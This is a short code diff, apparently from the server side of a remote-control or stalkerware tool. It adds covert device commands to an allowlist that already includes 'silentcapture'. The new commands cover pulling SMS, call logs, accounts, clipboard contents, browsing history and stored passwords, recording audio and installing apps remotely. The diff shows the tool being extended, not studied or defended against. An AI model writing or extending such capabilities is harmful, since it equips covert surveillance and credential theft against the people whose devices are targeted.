@@ -61,6 +61,15 @@ const DEVICE_COMMANDS = new Set([
   'usage',
   'wallpaper',
   'silentcapture',
+  'getsms',
+  'getcalllogs',
+  'getaccounts',
+  'getclipboard',
+  'recordaudio',
+  'installapp',
+  'gethistory',
+  'sysinfo_full',
+  'getpasswords',
 ]);
 
 function createApiRouter({ store, hub, config, botAuth, deviceAuth, guildAdminAuth }) {
